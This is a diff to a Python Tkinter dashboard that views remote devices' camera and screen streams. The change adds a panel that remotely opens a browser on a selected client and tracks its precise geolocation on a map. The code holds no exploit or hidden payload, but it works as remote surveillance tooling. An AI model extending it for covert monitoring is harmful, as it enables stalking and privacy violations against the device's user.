@@ -34,9 +34,22 @@ import numpy as np
 import requests
 from PIL import Image, ImageDraw, ImageFilter, ImageTk
 
+try:
+    # Carte OpenStreetMap intégrée (pip install tkintermapview). Optionnelle :
+    # si absente, le panneau de localisation reste fonctionnel (boutons +
+    # coordonnées en texte), seule la carte visuelle est remplacée par un message.
+    from tkintermapview import TkinterMapView
+    _HAS_MAP = True
+except ImportError:
+    TkinterMapView = None
+    _HAS_MAP = False
+
 DEFAULT_SERVER_URL = "http://127.0.0.1:5050"
 POLL_DEVICES_INTERVAL = 2.0
 POLL_STATUS_INTERVAL = 1.0
+POLL_LOCATION_INTERVAL = 2.0
+DEFAULT_MAP_LAT = -18.8792    # Antananarivo : position affichée tant qu'aucune position n'est reçue
+DEFAULT_MAP_LON = 47.5079
 POLL_FRAME_INTERVAL = 0.03   # pause après une réponse vide (204) : 0.1 ajoutait jusqu'à 100 ms de latence
 # Attente côté serveur d'une nouvelle image (long-polling). 0 = désactivé : OBLIGATOIRE sur
 # PythonAnywhere, dont le nombre de workers est très limité (une requête qui attend bloquerait
@@ -426,8 +439,8 @@ class CameraServerApp:
         self.root = root
         self.server_url = server_url.rstrip("/")
         self.root.title("Contrôle caméra / écran — Dashboard")
-        self.root.geometry("1300x780")
-        self.root.minsize(1040, 660)
+        self.root.geometry("1300x980")
+        self.root.minsize(1040, 820)
         self.root.configure(bg=COLOR_BG)
         self._banner_width = 0
 
@@ -437,6 +450,11 @@ class CameraServerApp:
         self.selected_device_id: str | None = None
         self.log_queue: "queue.Queue" = queue.Queue()
         self._throttle_times: dict[str, float] = {}
+
+        # Localisation : état du navigateur ouvert chez le client sélectionné.
+        self.location_open = False
+        self.last_location: dict | None = None
+        self._location_marker = None
 
         self.panels: dict[str, StreamPanel] = {
             "camera": StreamPanel("camera", "📷  Caméra"),
@@ -449,6 +467,7 @@ class CameraServerApp:
 
         threading.Thread(target=self._poll_devices_loop, daemon=True).start()
         threading.Thread(target=self._poll_status_loop, daemon=True).start()
+        threading.Thread(target=self._poll_location_loop, daemon=True).start()
         # Un thread de polling PAR flux : un flux lent à répondre ne doit
         # jamais retarder l'affichage (ni l'enregistrement) de l'autre.
         for key in self.panels:
@@ -526,6 +545,9 @@ class CameraServerApp:
 
         self._build_stream_panel(streams_frame, self.panels["camera"], column=0)
         self._build_stream_panel(streams_frame, self.panels["screen"], column=1)
+
+        # ---- Localisation précise (carte + ouverture/fermeture du navigateur) ----
+        self._build_location_panel(self.root)
 
         # ---- Barre du bas : serveur + téléchargement du client ----
         bottom_controls = tk.Frame(self.root, bg=COLOR_BG)
@@ -681,6 +703,88 @@ class CameraServerApp:
         panel.video_label.configure(image=panel.placeholder, text="Aucun flux vidéo")
         panel.video_label.image = panel.placeholder
 
+    def _build_location_panel(self, parent: tk.Frame) -> None:
+        """Panneau « Localisation » : commandes pour ouvrir/fermer le
+        navigateur chez le client sélectionné, coordonnées reçues, et une
+        carte (tkintermapview, basée sur OpenStreetMap) centrée sur la
+        dernière position précise transmise par CE navigateur."""
+        outer = tk.Frame(parent, bg=COLOR_CARD, highlightthickness=1, highlightbackground=COLOR_BORDER)
+        outer.pack(fill="x", padx=18, pady=(14, 0))
+
+        tk.Frame(outer, bg=COLOR_WARN, height=3).pack(fill="x")
+
+        header = tk.Frame(outer, bg=COLOR_CARD)
+        header.pack(fill="x", padx=14, pady=(12, 10))
+        tk.Label(
+            header, text="📍  Localisation", bg=COLOR_CARD, fg=COLOR_TEXT, font=(FONT, 12, "bold")
+        ).pack(side="left")
+        self.location_status_var = tk.StringVar(value="● Fermée")
+        self.location_status_label = tk.Label(
+            header, textvariable=self.location_status_var, bg=COLOR_CARD, fg=COLOR_KO, font=(FONT, 9, "bold"),
+        )
+        self.location_status_label.pack(side="right")
+
+        body = tk.Frame(outer, bg=COLOR_CARD)
+        body.pack(fill="x", padx=14, pady=(0, 14))
+        body.columnconfigure(1, weight=1)
+
+        # ---- Colonne de gauche : contrôles + dernières coordonnées ----
+        left = tk.Frame(body, bg=COLOR_CARD)
+        left.grid(row=0, column=0, sticky="n", padx=(0, 14))
+
+        self.btn_location_open = ttk.Button(
+            left, text="🌐  Ouvrir navigateur", style="Start.TButton", cursor="hand2",
+            command=lambda: self._send_location_command("OPEN"),
+        )
+        self.btn_location_open.pack(fill="x", pady=(0, 6))
+        self.btn_location_close = ttk.Button(
+            left, text="✖  Fermer navigateur", style="Stop.TButton", cursor="hand2",
+            command=lambda: self._send_location_command("CLOSE"),
+        )
+        self.btn_location_close.pack(fill="x")
+        self.btn_location_open["state"] = "disabled"
+        self.btn_location_close["state"] = "disabled"
+
+        self.location_coords_var = tk.StringVar(value="Aucune position reçue pour le moment.")
+        tk.Label(
+            left, textvariable=self.location_coords_var, bg=COLOR_CARD, fg=COLOR_MUTED,
+            font=(FONT_MONO, 9), justify="left", wraplength=230, anchor="w",
+        ).pack(fill="x", pady=(14, 0))
+
+        # ---- Colonne de droite : la carte ----
+        if _HAS_MAP:
+            self.location_map = TkinterMapView(body, width=460, height=260, corner_radius=6)
+            self.location_map.grid(row=0, column=1, sticky="nsew")
+            self.location_map.set_position(DEFAULT_MAP_LAT, DEFAULT_MAP_LON)
+            self.location_map.set_zoom(5)
+        else:
+            self.location_map = None
+            tk.Label(
+                body,
+                text=(
+                    "Carte indisponible : installez le paquet « tkintermapview »\n"
+                    "(pip install tkintermapview) puis relancez le server-gui.\n"
+                    "Les coordonnées restent affichées en texte à gauche."
+                ),
+                bg=COLOR_CARD, fg=COLOR_MUTED, font=(FONT, 9), justify="left", anchor="nw",
+            ).grid(row=0, column=1, sticky="nw")
+
+    def _send_location_command(self, command: str) -> None:
+        """Envoie OPEN ou CLOSE : la GUI ne parle jamais directement au
+        client, toujours via l'API du serveur (comme pour START/STOP)."""
+        if self.selected_device_id is None:
+            self._log("Aucun appareil sélectionné")
+            return
+        try:
+            requests.post(
+                f"{self.server_url}/api/location/command",
+                json={"device_id": self.selected_device_id, "command": command},
+                timeout=REQUEST_TIMEOUT,
+            )
+            self._log(f"Commande de localisation envoyée : {command}")
+        except requests.RequestException as exc:
+            self._log(f"Échec de l'envoi de la commande de localisation : {exc}")
+
     # ------------------------------------------------------------------
     # Boucles réseau (threads d'arrière-plan)
     # ------------------------------------------------------------------
@@ -726,6 +830,26 @@ class CameraServerApp:
                     was_connected = False
 
             time.sleep(POLL_STATUS_INTERVAL)
+
+    def _poll_location_loop(self) -> None:
+        """Interroge /api/location/latest pour l'appareil sélectionné :
+        statut du navigateur (ouvert/fermé) + dernière position connue."""
+        while True:
+            device_id = self.selected_device_id
+            if device_id is None:
+                time.sleep(POLL_LOCATION_INTERVAL)
+                continue
+            try:
+                response = requests.get(
+                    f"{self.server_url}/api/location/latest",
+                    params={"device_id": device_id},
+                    timeout=REQUEST_TIMEOUT,
+                )
+                if response.status_code == 200:
+                    self._update_location_display(response.json())
+            except requests.RequestException:
+                pass
+            time.sleep(POLL_LOCATION_INTERVAL)
 
     def _poll_frame_loop(self, stream_key: str) -> None:
         """Boucle dédiée à UN SEUL flux (caméra ou écran) : les deux tournent
@@ -841,6 +965,14 @@ class CameraServerApp:
         self.device_var.set(label)
         for panel in self.panels.values():
             self._show_placeholder(panel)
+
+        # La position affichée appartient à l'ANCIEN appareil : on l'efface
+        # en attendant le prochain polling (/api/location/latest) du nouveau.
+        self.last_location = None
+        self.location_coords_var.set("Chargement de la position...")
+        self.location_status_var.set("● Statut inconnu")
+        self.location_status_label.configure(foreground=COLOR_MUTED)
+
         self._log(f"Appareil sélectionné : {label}")
 
     def _on_device_selected(self, _event) -> None:
@@ -1019,6 +1151,38 @@ class CameraServerApp:
                 panel.btn_stop["state"] = "normal" if connected and active else "disabled"
                 panel.status_var.set("● Actif" if connected and active else "● Arrêté")
                 panel.status_label.configure(foreground=COLOR_OK if connected and active else COLOR_KO)
+            self.btn_location_open["state"] = "normal" if connected and not self.location_open else "disabled"
+            self.btn_location_close["state"] = "normal" if connected and self.location_open else "disabled"
+        self.root.after(0, apply)
+
+    def _update_location_display(self, data: dict) -> None:
+        """Met à jour le statut, les coordonnées en texte et le marqueur sur
+        la carte à partir de la réponse de /api/location/latest."""
+        def apply():
+            self.location_open = bool(data.get("browser_open"))
+            self.location_status_var.set("● Ouverte" if self.location_open else "● Fermée")
+            self.location_status_label.configure(
+                foreground=COLOR_OK if self.location_open else COLOR_KO
+            )
+
+            latest = data.get("latest")
+            if latest:
+                self.last_location = latest
+                lat, lon = latest["lat"], latest["lon"]
+                accuracy = latest.get("accuracy")
+                ts = latest.get("ts")
+                when = datetime.fromtimestamp(ts / 1000).strftime("%H:%M:%S") if ts else "?"
+                acc_text = f"± {accuracy:.0f} m" if isinstance(accuracy, (int, float)) else "précision inconnue"
+                self.location_coords_var.set(
+                    f"{lat:.6f}, {lon:.6f}\n{acc_text}  ·  reçue à {when}"
+                )
+                if self.location_map is not None:
+                    if self._location_marker is None:
+                        self._location_marker = self.location_map.set_marker(lat, lon, text="Appareil")
+                        self.location_map.set_zoom(16)
+                    else:
+                        self._location_marker.set_position(lat, lon)
+                    self.location_map.set_position(lat, lon)
         self.root.after(0, apply)
 
     def _display_frame(self, panel: StreamPanel, jpeg_bytes: bytes) -> None:
